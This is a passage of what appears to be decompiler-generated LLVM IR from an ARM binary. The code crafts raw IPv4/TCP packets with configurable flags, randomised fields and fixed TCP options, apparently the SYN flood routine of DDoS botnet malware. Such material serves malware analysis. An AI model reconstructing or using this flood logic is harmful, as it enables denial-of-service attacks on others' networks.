  %tmp73 = udiv i32 %v5_d544, 256
  %v4_d6c8 = urem i32 %tmp73, 256
  %v5_d6c8 = or i32 %v4_d6c8, %v1_d6c0
  store i32 %v5_d6c8, i32* %r5.global-to-local, align 4
  %v1_d6d8 = urem i32 %v6_d574, 2
  %tmp74 = udiv i32 %v7_d4b0, 256
  %v1_d6e0 = urem i32 %v6_d58c, 2
  %v3_d6f0 = mul nuw nsw i32 %v1_d6a8, 256
  store i32 %v3_d6f0, i32* %r1.global-to-local, align 4
  %tmp75 = udiv i32 %v0_d668, 256
  %v4_d6fc = urem i32 %tmp75, 256
  %v5_d6fc = or i32 %v4_d6fc, %v3_d6f0
  store i32 %v5_d6fc, i32* %r7.global-to-local, align 4
  %v1_d700 = urem i32 %v6_d5a4, 2
  %v1_d704 = urem i32 %v6_d5bc, 2
  %v1_d708 = urem i32 %v6_d5d4, 2
  %v1_d718 = urem i32 %v6_d5ec, 2
  store i32 %v1_d718, i32* %r0.global-to-local, align 4
  store i32 %v1_d6b0, i32* %r2.global-to-local, align 4
  store i32 %v1_d6a8, i32* %r3.global-to-local, align 4
  store i32 %v1_d6b4, i32* %ip.global-to-local, align 4
  %v5_d728 = trunc i32 %tmp74 to i8
  %v5_d738 = trunc i32 %v0_d66c to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext = mul i32 %v6_d4c8, 16777216
  %v4_d788 = sdiv i32 %sext, 16777216
  %sext9 = mul i32 %v7_d4b0, 16777216
  %v4_d7a0 = sdiv i32 %sext9, 16777216
  %tmp = sub nsw i32 0, %v1_d6d8
  %v4_d7fc = and i32 %tmp, 32
  %tmp79 = sub nsw i32 0, %v1_d6e0
  %v4_d810 = and i32 %tmp79, 16
  %tmp80 = sub nsw i32 0, %v1_d700
  %v4_d824 = and i32 %tmp80, 8
  %tmp81 = sub nsw i32 0, %v1_d704
  %v4_d838 = and i32 %tmp81, 4
  %tmp82 = sub nsw i32 0, %v1_d708
  %v3_d84c = and i32 %tmp82, 2
  %v7_d87c = sext i8 %v5_d738 to i32
  %sext78 = mul i32 %v0_d668, 16777216
  %v3_d87c = sdiv i32 %sext78, 16777216
  br label %dec_label_pc_d740

dec_label_pc_d740:                                ; preds = %bb77, %dec_label_pc_d698
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_d748 = call i32* @calloc(i32 128, i32 1)
  %v4_d748 = ptrtoint i32* %v2_d748 to i32
  store i32 %v4_d748, i32* %r0.global-to-local, align 4
  %v3_d74c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d74c, i32* %r2.global-to-local, align 4
  %v1_d750 = load i32, i32* %fp.global-to-local, align 4
  %v2_d750 = load i32, i32* %r4.global-to-local, align 4
  %v5_d750 = mul i32 %v2_d750, 4
  %v6_d750 = add i32 %v5_d750, %v1_d750
  %v7_d750 = inttoptr i32 %v6_d750 to i32*
  store i32 %v4_d748, i32* %v7_d750, align 4
  %v0_d754 = load i32, i32* %fp.global-to-local, align 4
  %v1_d754 = load i32, i32* %r2.global-to-local, align 4
  %v4_d754 = mul i32 %v1_d754, 4
  %v5_d754 = add i32 %v4_d754, %v0_d754
  %v6_d754 = inttoptr i32 %v5_d754 to i32*
  %v7_d754 = load i32, i32* %v6_d754, align 4
  store i32 %v7_d754, i32* %r4.global-to-local, align 4
  %v1_d758 = inttoptr i32 %v7_d754 to i8*
  %v2_d758 = load i8, i8* %v1_d758, align 1
  %tmp83 = urem i8 %v2_d758, 16
  %v1_d75c = zext i8 %tmp83 to i32
  %v1_d760 = or i32 %v1_d75c, 64
  store i32 %v1_d760, i32* %r3.global-to-local, align 4
  %v1_d764 = trunc i32 %v1_d760 to i8
  store i8 %v1_d764, i8* %v1_d758, align 1
  %v0_d768 = load i32, i32* %r4.global-to-local, align 4
  %v1_d768 = inttoptr i32 %v0_d768 to i8*
  %v2_d768 = load i8, i8* %v1_d768, align 1
  %v1_d76c = and i8 %v2_d768, -16
  %v1_d770 = or i8 %v1_d76c, 5
  store i32 %v1_d4f4, i32* %r0.global-to-local, align 4
  store i8 %v1_d770, i8* %v1_d768, align 1
  %v2_d780 = load i32, i32* %r4.global-to-local, align 4
  %v3_d780 = add i32 %v2_d780, 1
  %v4_d780 = inttoptr i32 %v3_d780 to i8*
  store i8 %v5_d4ac, i8* %v4_d780, align 1
  store i32 %v4_d788, i32* %r2.global-to-local, align 4
  %v2_d78c = load i32, i32* %r4.global-to-local, align 4
  %v3_d78c = add i32 %v2_d78c, 4
  %v4_d78c = inttoptr i32 %v3_d78c to i8*
  store i8 %v5_d728, i8* %v4_d78c, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_d798 = load i32, i32* %r0.global-to-local, align 4
  %v2_d798 = icmp eq i32 %v0_d798, 0
  store i1 %v2_d798, i1* %cpsr_z.global-to-local, align 1
  %v2_d79c = load i32, i32* %r4.global-to-local, align 4
  %v3_d79c = add i32 %v2_d79c, 3
  %v4_d79c = inttoptr i32 %v3_d79c to i8*
  store i8 60, i8* %v4_d79c, align 1
  store i32 %v4_d7a0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d7a8 = trunc i32 %v0_d7a8 to i8
  %v2_d7a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7a8 = add i32 %v2_d7a8, 8
  %v4_d7a8 = inttoptr i32 %v3_d7a8 to i8*
  store i8 %v1_d7a8, i8* %v4_d7a8, align 1
  %v0_d7ac = load i32, i32* %ip.global-to-local, align 4
  %v1_d7ac = trunc i32 %v0_d7ac to i8
  %v2_d7ac = load i32, i32* %r4.global-to-local, align 4
  %v3_d7ac = add i32 %v2_d7ac, 9
  %v4_d7ac = inttoptr i32 %v3_d7ac to i8*
  store i8 %v1_d7ac, i8* %v4_d7ac, align 1
  %v0_d7b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7b0 = trunc i32 %v0_d7b0 to i8
  %v2_d7b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7b0 = add i32 %v2_d7b0, 2
  %v4_d7b0 = inttoptr i32 %v3_d7b0 to i8*
  store i8 %v1_d7b0, i8* %v4_d7b0, align 1
  %v3_d7b4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d7b4, i32* %r2.global-to-local, align 4
  %v0_d7b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7b8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d740
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d7bc = load i32, i32* %r4.global-to-local, align 4
  %v4_d7bc = add i32 %v3_d7bc, 6
  %v5_d7bc = inttoptr i32 %v4_d7bc to i8*
  store i8 64, i8* %v5_d7bc, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d740, %bb
  %v0_d7c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_d7c0 = trunc i32 %v0_d7c0 to i8
  %v2_d7c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7c0 = add i32 %v2_d7c0, 5
  %v4_d7c0 = inttoptr i32 %v3_d7c0 to i8*
  store i8 %v1_d7c0, i8* %v4_d7c0, align 1
  %v0_d7c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7c4, label %.thread10, label %bb76

.thread10:                                        ; preds = %.thread
  store i32 %v6_d608, i32* %r0.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_d608, i32* %r0.global-to-local, align 4
  %v3_d7cc = load i32, i32* %r4.global-to-local, align 4
  %v4_d7cc = add i32 %v3_d7cc, 7
  %v5_d7cc = inttoptr i32 %v4_d7cc to i8*
  store i8 0, i8* %v5_d7cc, align 1
  %v0_d7d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %.thread10, %bb76
  %v0_d7d4 = phi i32 [ %v6_d608, %.thread10 ], [ %v0_d7d4.pre, %bb76 ]
  %v0_d7d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d7d0 = mul i32 %v0_d7d0, 32
  store i32 %v3_d7d0, i32* %r3.global-to-local, align 4
  %v1_d7d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d7d4 = add i32 %v1_d7d4, 12
  %v3_d7d4 = inttoptr i32 %v2_d7d4 to i32*
  store i32 %v0_d7d4, i32* %v3_d7d4, align 4
  %v0_d7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7d8 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_d7d8, -8
  %v5_d7d8 = add i32 %v0_d7d8, %tmp84
  %v1_d7dc = load i32, i32* @r8, align 4
  %v2_d7dc = add i32 %v1_d7dc, %v5_d7d8
  store i32 %v2_d7dc, i32* %r3.global-to-local, align 4
  %v1_d7e0 = add i32 %v2_d7dc, 16
  %v2_d7e0 = inttoptr i32 %v1_d7e0 to i32*
  %v3_d7e0 = load i32, i32* %v2_d7e0, align 4
  store i32 %v3_d7e0, i32* %r2.global-to-local, align 4
  %v0_d7e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_d7e4 = trunc i32 %v0_d7e4 to i8
  %v2_d7e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7e4 = add i32 %v2_d7e4, 20
  %v4_d7e4 = inttoptr i32 %v3_d7e4 to i8*
  store i8 %v1_d7e4, i8* %v4_d7e4, align 1
  %v0_d7e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d7e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d7e8 = add i32 %v1_d7e8, 16
  %v3_d7e8 = inttoptr i32 %v2_d7e8 to i32*
  store i32 %v0_d7e8, i32* %v3_d7e8, align 4
  %v0_d7ec = load i32, i32* %r4.global-to-local, align 4
  %v1_d7ec = add i32 %v0_d7ec, 20
  store i32 %v1_d7ec, i32* %r1.global-to-local, align 4
  %v1_d7f0 = add i32 %v0_d7ec, 33
  %v2_d7f0 = inttoptr i32 %v1_d7f0 to i8*
  %v3_d7f0 = load i8, i8* %v2_d7f0, align 1
  %v4_d7f0 = zext i8 %v3_d7f0 to i32
  store i32 %v1_d6d8, i32* %r2.global-to-local, align 4
  %v1_d7f8 = and i32 %v4_d7f0, 223
  %v5_d7fc = or i32 %v1_d7f8, %v4_d7fc
  store i32 %v5_d7fc, i32* %r3.global-to-local, align 4
  %v1_d800 = trunc i32 %v5_d7fc to i8
  store i8 %v1_d800, i8* %v2_d7f0, align 1
  %v0_d804 = load i32, i32* %r1.global-to-local, align 4
  %v1_d804 = add i32 %v0_d804, 13
  %v2_d804 = inttoptr i32 %v1_d804 to i8*
  %v3_d804 = load i8, i8* %v2_d804, align 1
  %v4_d804 = zext i8 %v3_d804 to i32
  store i32 %v1_d6e0, i32* %r3.global-to-local, align 4
  %v1_d80c = and i32 %v4_d804, 239
  %v5_d810 = or i32 %v1_d80c, %v4_d810
  store i32 %v5_d810, i32* %r2.global-to-local, align 4
  %v1_d814 = trunc i32 %v5_d810 to i8
  store i8 %v1_d814, i8* %v2_d804, align 1
  %v0_d818 = load i32, i32* %r1.global-to-local, align 4
  %v1_d818 = add i32 %v0_d818, 13
  %v2_d818 = inttoptr i32 %v1_d818 to i8*
  %v3_d818 = load i8, i8* %v2_d818, align 1
  %v4_d818 = zext i8 %v3_d818 to i32
  store i32 %v1_d700, i32* %ip.global-to-local, align 4
  %v1_d820 = and i32 %v4_d818, 247
  %v5_d824 = or i32 %v1_d820, %v4_d824
  store i32 %v5_d824, i32* %r3.global-to-local, align 4
  %v1_d828 = trunc i32 %v5_d824 to i8
  store i8 %v1_d828, i8* %v2_d818, align 1
  %v0_d82c = load i32, i32* %r1.global-to-local, align 4
  %v1_d82c = add i32 %v0_d82c, 13
  %v2_d82c = inttoptr i32 %v1_d82c to i8*
  %v3_d82c = load i8, i8* %v2_d82c, align 1
  %v4_d82c = zext i8 %v3_d82c to i32
  store i32 %v1_d704, i32* %r0.global-to-local, align 4
  %v1_d834 = and i32 %v4_d82c, 251
  %v5_d838 = or i32 %v1_d834, %v4_d838
  store i32 %v5_d838, i32* %r2.global-to-local, align 4
  %v1_d83c = trunc i32 %v5_d838 to i8
  store i8 %v1_d83c, i8* %v2_d82c, align 1
  %v0_d840 = load i32, i32* %r1.global-to-local, align 4
  %v1_d840 = add i32 %v0_d840, 13
  %v2_d840 = inttoptr i32 %v1_d840 to i8*
  %v3_d840 = load i8, i8* %v2_d840, align 1
  %v4_d840 = zext i8 %v3_d840 to i32
  store i32 %v1_d708, i32* %r2.global-to-local, align 4
  %v1_d848 = and i32 %v4_d840, 253
  %v4_d84c = or i32 %v1_d848, %v3_d84c
  store i32 %v4_d84c, i32* %r3.global-to-local, align 4
  %v1_d850 = trunc i32 %v4_d84c to i8
  store i8 %v1_d850, i8* %v2_d840, align 1
  %v0_d854 = load i32, i32* %r1.global-to-local, align 4
  %v1_d854 = add i32 %v0_d854, 12
  %v2_d854 = inttoptr i32 %v1_d854 to i8*
  %v3_d854 = load i8, i8* %v2_d854, align 1
  %v4_d854 = zext i8 %v3_d854 to i32
  store i32 %v4_d854, i32* %r2.global-to-local, align 4
  %v1_d858 = add i32 %v0_d854, 13
  %v2_d858 = inttoptr i32 %v1_d858 to i8*
  %v3_d858 = load i8, i8* %v2_d858, align 1
  %v4_d858 = zext i8 %v3_d858 to i32
  %tmp85 = urem i8 %v3_d854, 16
  %v1_d860 = zext i8 %tmp85 to i32
  %v1_d864 = and i32 %v4_d858, 254
  %v2_d868 = or i32 %v1_d864, %v1_d718
  %v1_d86c = or i32 %v1_d860, 160
  store i32 %v1_d86c, i32* %r2.global-to-local, align 4
  %v1_d870 = trunc i32 %v2_d868 to i8
  store i8 %v1_d870, i8* %v2_d858, align 1
  %v0_d874 = load i32, i32* %r2.global-to-local, align 4
  %v1_d874 = trunc i32 %v0_d874 to i8
  %v2_d874 = load i32, i32* %r1.global-to-local, align 4
  %v3_d874 = add i32 %v2_d874, 12
  %v4_d874 = inttoptr i32 %v3_d874 to i8*
  store i8 %v1_d874, i8* %v4_d874, align 1
  store i32 %v3_d87c, i32* %r0.global-to-local, align 4
  store i32 %v7_d87c, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_d888 = load i32, i32* %r1.global-to-local, align 4
  %v3_d888 = add i32 %v2_d888, 3
  %v4_d888 = inttoptr i32 %v3_d888 to i8*
  store i8 %v5_d738, i8* %v4_d888, align 1
  %v0_d88c = load i32, i32* %r0.global-to-local, align 4
  %v1_d88c = trunc i32 %v0_d88c to i8
  %v2_d88c = load i32, i32* %r1.global-to-local, align 4
  %v3_d88c = add i32 %v2_d88c, 1
  %v4_d88c = inttoptr i32 %v3_d88c to i8*
  store i8 %v1_d88c, i8* %v4_d88c, align 1
  %v0_d890 = load i32, i32* %r6.global-to-local, align 4
  %v1_d890 = trunc i32 %v0_d890 to i8
  %v2_d890 = load i32, i32* %r1.global-to-local, align 4
  %v3_d890 = add i32 %v2_d890, 2
  %v4_d890 = inttoptr i32 %v3_d890 to i8*
  store i8 %v1_d890, i8* %v4_d890, align 1
  %v0_d894 = load i32, i32* %r5.global-to-local, align 4
  %v1_d894 = load i32, i32* %r1.global-to-local, align 4
  %v2_d894 = add i32 %v1_d894, 4
  %v3_d894 = inttoptr i32 %v2_d894 to i32*
  store i32 %v0_d894, i32* %v3_d894, align 4
  %v0_d898 = load i32, i32* %ip.global-to-local, align 4
  %v1_d898 = trunc i32 %v0_d898 to i8
  %v2_d898 = load i32, i32* %r4.global-to-local, align 4
  %v3_d898 = add i32 %v2_d898, 41
  %v4_d898 = inttoptr i32 %v3_d898 to i8*
  store i8 %v1_d898, i8* %v4_d898, align 1
  %v0_d89c = load i32, i32* %r3.global-to-local, align 4
  %v1_d89c = trunc i32 %v0_d89c to i8
  %v2_d89c = load i32, i32* %r4.global-to-local, align 4
  %v3_d89c = add i32 %v2_d89c, 40
  %v4_d89c = inttoptr i32 %v3_d89c to i8*
  store i8 %v1_d89c, i8* %v4_d89c, align 1
  %v0_d8a0 = call i32 @function_10b68()
  %v1_d8a4 = mul i32 %v0_d8a0, 256
  %v1_d8a8 = and i32 %v1_d8a4, 3840
  %v1_d8ac = or i32 %v1_d8a8, 28672
  %v3_d8b4 = add nuw nsw i32 %v1_d8ac, 2048
  %v3_d8c08 = udiv i32 %v3_d8b4, 256
  store i32 %v3_d8c08, i32* %r1.global-to-local, align 4
  %v0_d8c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8c4 = add i32 %v0_d8c4, 42
  store i32 %v1_d8c4, i32* %r2.global-to-local, align 4
  %v4_d8c8 = inttoptr i32 %v1_d8c4 to i8*
  store i8 5, i8* %v4_d8c8, align 1
  %v0_d8cc = load i32, i32* %r1.global-to-local, align 4
  %v1_d8cc = trunc i32 %v0_d8cc to i8
  %v2_d8cc = load i32, i32* %r2.global-to-local, align 4
  %v3_d8cc = add i32 %v2_d8cc, 1
  %v4_d8cc = inttoptr i32 %v3_d8cc to i8*
  store i8 %v1_d8cc, i8* %v4_d8cc, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_d8d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8d8 = add i32 %v2_d8d8, 47
  %v4_d8d8 = inttoptr i32 %v3_d8d8 to i8*
  store i8 10, i8* %v4_d8d8, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d8e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d8e4 = trunc i32 %v0_d8e4 to i8
  %v2_d8e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8e4 = add i32 %v2_d8e4, 46
  %v4_d8e4 = inttoptr i32 %v3_d8e4 to i8*
  store i8 %v1_d8e4, i8* %v4_d8e4, align 1
  %v0_d8e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d8e8 = trunc i32 %v0_d8e8 to i8
  %v2_d8e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8e8 = add i32 %v2_d8e8, 45
  %v4_d8e8 = inttoptr i32 %v3_d8e8 to i8*
  store i8 %v1_d8e8, i8* %v4_d8e8, align 1
  %v0_d8ec = load i32, i32* %r0.global-to-local, align 4
  %v1_d8ec = trunc i32 %v0_d8ec to i8
  %v2_d8ec = load i32, i32* %r4.global-to-local, align 4
  %v3_d8ec = add i32 %v2_d8ec, 44
  %v4_d8ec = inttoptr i32 %v3_d8ec to i8*
  store i8 %v1_d8ec, i8* %v4_d8ec, align 1
  %v0_d8f0 = call i32 @function_10b68()
  store i32 %v0_d8f0, i32* %r0.global-to-local, align 4
  %v2_d8f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8f8 = add i32 %v2_d8f8, 56
  %v4_d8f8 = inttoptr i32 %v3_d8f8 to i8*
  store i8 1, i8* %v4_d8f8, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d908 = load i32, i32* %r4.global-to-local, align 4
  %v2_d908 = add i32 %v1_d908, 48
  %v3_d908 = inttoptr i32 %v2_d908 to i32*
  store i32 %v0_d8f0, i32* %v3_d908, align 4
  %v0_d90c = load i32, i32* %r2.global-to-local, align 4
  %v1_d90c = trunc i32 %v0_d90c to i8
  %v2_d90c = load i32, i32* %r4.global-to-local, align 4
  %v3_d90c = add i32 %v2_d90c, 58
  %v4_d90c = inttoptr i32 %v3_d90c to i8*
  store i8 %v1_d90c, i8* %v4_d90c, align 1
  %v0_d910 = load i32, i32* %r3.global-to-local, align 4
  %v1_d910 = trunc i32 %v0_d910 to i8
  %v2_d910 = load i32, i32* %r4.global-to-local, align 4
  %v3_d910 = add i32 %v2_d910, 59
  %v4_d910 = inttoptr i32 %v3_d910 to i8*
  store i8 %v1_d910, i8* %v4_d910, align 1
  %v0_d914 = load i32, i32* %ip.global-to-local, align 4
  %v1_d914 = load i32, i32* %r4.global-to-local, align 4
  %v2_d914 = add i32 %v1_d914, 52
  %v3_d914 = inttoptr i32 %v2_d914 to i32*
  store i32 %v0_d914, i32* %v3_d914, align 4
  %v0_d918 = load i32, i32* %r2.global-to-local, align 4
  %v1_d918 = trunc i32 %v0_d918 to i8
  %v2_d918 = load i32, i32* %r4.global-to-local, align 4
  %v3_d918 = add i32 %v2_d918, 57
  %v4_d918 = inttoptr i32 %v3_d918 to i8*
  store i8 %v1_d918, i8* %v4_d918, align 1
  %v3_d91c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d91c, i32* %r3.global-to-local, align 4
  %v1_d920 = add i32 %v3_d91c, 1
  store i32 %v1_d920, i32* %r4.global-to-local, align 4
  %v0_d924 = load i32, i32* @sl, align 4
  %v9_d924 = icmp eq i32 %v0_d924, %v1_d920
  store i1 %v9_d924, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d920, i32* %stack_var_-40, align 4
  %v8_d92c = icmp sgt i32 %v0_d924, %v1_d920
  br i1 %v8_d92c, label %dec_label_pc_d740, label %dec_label_pc_d930

dec_label_pc_d930:                                ; preds = %bb77, %dec_label_pc_d654
  %v0_d930 = phi i32 [ %v0_d680, %dec_label_pc_d654 ], [ %v0_d924, %bb77 ]
  %v2_d930 = icmp eq i32 %v0_d930, 0
  store i1 %v2_d930, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dae8 = icmp eq i32 %v3_d670, 65535
  %v2_db64 = icmp eq i32 %v1_d67c, 0
  %v2_d96c = icmp eq i32 %v6_d608, -1
  %v7_d96c = icmp eq i32 %v6_d608, -1
  br label %dec_label_pc_d938.outer

dec_label_pc_d938.outer:                          ; preds = %dec_label_pc_da64, %dec_label_pc_d930
  %v1_d938.ph.in = phi i32 [ %v0_da58, %dec_label_pc_da64 ], [ %v0_d930, %dec_label_pc_d930 ]
  %v0_d938.ph = phi i1 [ %v2_da64, %dec_label_pc_da64 ], [ %v2_d930, %dec_label_pc_d930 ]
  %v1_d938.ph = icmp slt i32 %v1_d938.ph.in, 0
  %v4_d938 = or i1 %v1_d938.ph, %v0_d938.ph
  br label %dec_label_pc_d938

dec_label_pc_d938:                                ; preds = %dec_label_pc_d938.outer, %dec_label_pc_d938
  br i1 %v4_d938, label %dec_label_pc_d938, label %dec_label_pc_d93c

dec_label_pc_d93c:                                ; preds = %dec_label_pc_d938
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d948

dec_label_pc_d948:                                ; preds = %dec_label_pc_d9c4, %dec_label_pc_d93c
  %v1_d958 = phi i32 [ %v1_da54, %dec_label_pc_d9c4 ], [ 0, %dec_label_pc_d93c ]
  %v5_d94c = mul i32 %v1_d958, 24
  %v1_d950 = load i32, i32* @r8, align 4
  %v2_d950 = add i32 %v1_d950, %v5_d94c
  store i32 %v2_d950, i32* %r3.global-to-local, align 4
  %v1_d954 = add i32 %v2_d950, 20
  %v2_d954 = inttoptr i32 %v1_d954 to i8*
  %v3_d954 = load i8, i8* %v2_d954, align 1
  %v4_d954 = zext i8 %v3_d954 to i32
  store i32 %v4_d954, i32* %r2.global-to-local, align 4
  %v0_d958 = load i32, i32* %fp.global-to-local, align 4
  %v4_d958 = mul i32 %v1_d958, 4
  %v5_d958 = add i32 %v0_d958, %v4_d958
  %v6_d958 = inttoptr i32 %v5_d958 to i32*
  %v7_d958 = load i32, i32* %v6_d958, align 4
  store i32 %v7_d958, i32* @r5, align 4
  %v7_d95c = icmp eq i8 %v3_d954, 31
  store i1 %v7_d95c, i1* %cpsr_z.global-to-local, align 1
  %v1_d960 = add i32 %v7_d958, 20
  store i32 %v1_d960, i32* @r6, align 4
  %tmp86 = icmp ult i8 %v3_d954, 32
  br i1 %tmp86, label %dec_label_pc_da70, label %dec_label_pc_d968

dec_label_pc_d968:                                ; preds = %dec_label_pc_d948
  store i32 %v6_d608, i32* %r0.global-to-local, align 4
  store i1 %v7_d96c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d96c, label %dec_label_pc_dad8, label %dec_label_pc_d974

dec_label_pc_d974:                                ; preds = %dec_label_pc_da70, %dec_label_pc_d968
  store i32 %v3_d670, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_dae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dae8, label %dec_label_pc_daf4, label %dec_label_pc_d988

dec_label_pc_d988:                                ; preds = %dec_label_pc_dad8.dec_label_pc_d988_crit_edge, %dec_label_pc_d974
  %v1_d98c = phi i32 [ %v1_d98c.pre, %dec_label_pc_dad8.dec_label_pc_d988_crit_edge ], [ 65535, %dec_label_pc_d974 ]
  store i32 %v3_d674, i32* %r3.global-to-local, align 4
  %v9_d98c = icmp eq i32 %v3_d674, %v1_d98c
  store i1 %v9_d98c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d98c, label %dec_label_pc_db10, label %dec_label_pc_d994

dec_label_pc_d994:                                ; preds = %dec_label_pc_daf4.dec_label_pc_d994_crit_edge, %dec_label_pc_d988
  %v1_d998 = phi i32 [ %v1_d998.pre, %dec_label_pc_daf4.dec_label_pc_d994_crit_edge ], [ %v1_d98c, %dec_label_pc_d988 ]
  store i32 %v3_d678, i32* %ip.global-to-local, align 4
  %v9_d998 = icmp eq i32 %v3_d678, %v1_d998
  store i1 %v9_d998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d998, label %dec_label_pc_db2c, label %dec_label_pc_d9a0

dec_label_pc_d9a0:                                ; preds = %dec_label_pc_db10.dec_label_pc_d9a0_crit_edge, %dec_label_pc_d994
  %v1_d9a4 = phi i32 [ %v1_d9a4.pre, %dec_label_pc_db10.dec_label_pc_d9a0_crit_edge ], [ %v1_d998, %dec_label_pc_d994 ]
  store i32 %v5_d544, i32* %r0.global-to-local, align 4
  %v9_d9a4 = icmp eq i32 %v5_d544, %v1_d9a4
  store i1 %v9_d9a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d9a4, label %dec_label_pc_db48, label %dec_label_pc_d9ac

dec_label_pc_d9ac:                                ; preds = %dec_label_pc_db2c.dec_label_pc_d9ac_crit_edge, %dec_label_pc_d9a0
  %v1_d9b0 = phi i32 [ %v1_d9b0.pre, %dec_label_pc_db2c.dec_label_pc_d9ac_crit_edge ], [ %v1_d9a4, %dec_label_pc_d9a0 ]
  store i32 %v6_d55c, i32* %r2.global-to-local, align 4
  %v9_d9b0 = icmp eq i32 %v6_d55c, %v1_d9b0
  store i1 %v9_d9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d9b0, label %dec_label_pc_db5c, label %dec_label_pc_d9b8

dec_label_pc_d9b8:                                ; preds = %dec_label_pc_db48, %dec_label_pc_d9ac
  store i32 %v1_d67c, i32* %r3.global-to-local, align 4
  store i1 %v2_db64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_db64, label %dec_label_pc_d9c4, label %dec_label_pc_db70

dec_label_pc_d9c4:                                ; preds = %dec_label_pc_d9b8, %dec_label_pc_db5c, %dec_label_pc_db70
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d9c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_d9c8 = trunc i32 %v0_d9c8 to i8
  %v2_d9c8 = load i32, i32* @r5, align 4
  %v3_d9c8 = add i32 %v2_d9c8, 10
  %v4_d9c8 = inttoptr i32 %v3_d9c8 to i8*
  store i8 %v1_d9c8, i8* %v4_d9c8, align 1
  %v0_d9cc = load i32, i32* %r7.global-to-local, align 4
  %v1_d9cc = trunc i32 %v0_d9cc to i8
  %v2_d9cc = load i32, i32* @r5, align 4
  %v3_d9cc = add i32 %v2_d9cc, 11
  %v4_d9cc = inttoptr i32 %v3_d9cc to i8*
  store i8 %v1_d9cc, i8* %v4_d9cc, align 1
  %v0_d9d0 = load i32, i32* @r5, align 4
  store i32 %v0_d9d0, i32* @r0, align 4
  %v2_d9d4 = call i32 @function_f17c(i32 %v0_d9d0, i32 20)
  %v3_d9d4 = trunc i32 %v2_d9d4 to i8
  %v4_d9d828 = udiv i32 %v2_d9d4, 256
  %v1_d9dc = trunc i32 %v4_d9d828 to i8
  %v2_d9dc = load i32, i32* @r5, align 4
  %v3_d9dc = add i32 %v2_d9dc, 11
  %v4_d9dc = inttoptr i32 %v3_d9dc to i8*
  store i8 %v1_d9dc, i8* %v4_d9dc, align 1
  %v3_d9e0 = load i32, i32* @r5, align 4
  %v4_d9e0 = add i32 %v3_d9e0, 10
  %v5_d9e0 = inttoptr i32 %v4_d9e0 to i8*
  store i8 %v3_d9d4, i8* %v5_d9e0, align 1
  %v0_d9e4 = load i32, i32* @r6, align 4
  store i32 %v0_d9e4, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_d9f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_d9f0 = trunc i32 %v0_d9f0 to i8
  %v3_d9f0 = add i32 %v0_d9e4, 16
  %v4_d9f0 = inttoptr i32 %v3_d9f0 to i8*
  store i8 %v1_d9f0, i8* %v4_d9f0, align 1
  %v0_d9f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_d9f4 = trunc i32 %v0_d9f4 to i8
  %v2_d9f4 = load i32, i32* @r6, align 4
  %v3_d9f4 = add i32 %v2_d9f4, 17
  %v4_d9f4 = inttoptr i32 %v3_d9f4 to i8*
  store i8 %v1_d9f4, i8* %v4_d9f4, align 1
